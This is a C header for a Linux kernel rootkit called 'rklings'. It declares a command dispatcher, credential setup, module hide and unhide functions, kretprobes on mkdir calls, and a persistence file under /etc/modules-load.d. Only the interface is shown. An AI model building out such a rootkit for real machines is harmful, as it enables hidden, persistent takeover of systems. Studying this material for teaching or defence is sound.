/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/kprobes.h>

#define RK_CMD_MAX	16
#define PERSIST_PATH	"/etc/modules-load.d/rklings.conf"
#define MODULE_NAME_STR "rklings"

typedef int (*rk_handler_t)(const char *arg);

int rk_cmd_register(const char *key, rk_handler_t handler);
int rk_dispatch(const char *name);

int rk_cred_init(void);
int rk_module_init(void);

void rk_module_hide(void);
void rk_module_unhide(void);

extern struct kretprobe rk_mkdir_probe;
extern struct kretprobe rk_mkdirat_probe;

#endif
